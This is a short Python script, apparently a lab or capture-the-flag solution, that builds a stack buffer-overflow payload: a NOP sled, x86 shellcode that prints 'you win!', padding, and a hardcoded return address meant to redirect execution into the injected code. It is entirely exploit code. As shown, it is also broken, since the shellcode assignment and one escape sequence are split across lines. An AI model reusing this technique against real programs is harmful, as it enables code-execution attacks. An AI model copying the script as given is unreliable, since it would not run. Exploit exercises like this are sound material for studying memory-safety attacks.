from struct import pack
shellcode =
"\xeb\x11\x59\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x09\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xea\xff\xff\xff\x7
9\x6f\x75\x20\x77\x69\x6e\x21\x0b"
ret_addr = 0xbffff5c4 
output = "\x90" * 20 
output += shellcode 
output += "A" * (80 - 20 - len(shellcode)) 
output += "BBBB" 
output += "CCCC" 
output += pack("<I", ret_addr) 
print(output)